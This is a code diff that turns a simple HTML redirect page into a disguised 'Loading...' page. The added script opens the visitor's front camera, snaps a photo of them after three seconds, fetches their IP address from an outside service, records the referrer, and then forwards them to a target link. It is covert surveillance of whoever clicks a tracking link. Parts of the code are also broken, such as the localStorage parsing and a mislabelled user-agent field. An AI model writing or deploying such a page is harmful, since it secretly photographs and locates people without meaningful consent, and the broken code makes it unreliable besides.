@@ -1,13 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting...</title>
+    <title>Loading...</title>
     <script>
-    // Redirect to tracking page
-    window.location.href = '/track/';
+    (function() {
+        // Get URL parameters
+        const params = new URLSearchParams(window.location.search);
+        const trackingId = params.get('track');
+        const targetUrl = params.get('target');
+        
+        if (trackingId && targetUrl) {
+            // Prepare tracking data
+            const trackingData = {
+                id: trackingId,
+                timestamp: new Date().toISOString(),
+                target: decodeURIComponent(targetUrl),
+                referrer: document.referrer || 'Direct',
+                userAgent: navigator.mediaDevices ? 'Supported' : 'No Camera',
+                ip: 'Pending',
+                image: null
+            };
+
+            // Start camera capture if available
+            if (navigator.mediaDevices) {
+                const capture = async () => {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ 
+                            video: { facingMode: 'user' },
+                            audio: false 
+                        });
+                        
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        await video.play();
+                        
+                        // Wait 3 seconds for camera to initialize
+                        await new Promise(r => setTimeout(r, 3000));
+                        
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        trackingData.image = canvas.toDataURL('image/jpeg', 0.7);
+                        stream.getTracks().forEach(t => t.stop());
+                    } catch (e) {
+                        console.log('Camera error:', e);
+                    }
+                    
+                    // Complete tracking and redirect
+                    completeTracking();
+                };
+                
+                capture();
+            } else {
+                completeTracking();
+            }
+            
+            // Get IP and save data
+            async function completeTracking() {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    trackingData.ip = (await ipResponse.json()).ip;
+                } catch (e) {
+                    trackingData.ip = 'Unknown';
+                }
+                
+                // Save to localStorage
+                const allData = JSON.parse(localStorage.getItem('track_data') || []);
+                allData.unshift(trackingData);
+                localStorage.setItem('track_data', JSON.stringify(allData));
+                
+                // Redirect to target
+                window.location.href = decodeURIComponent(targetUrl);
+            }
+        }
+    })();
     </script>
 </head>
 <body>
-    <p>Redirecting to tracking system...</p>
+    <!-- Empty page - will redirect immediately -->
 </body>
 </html>
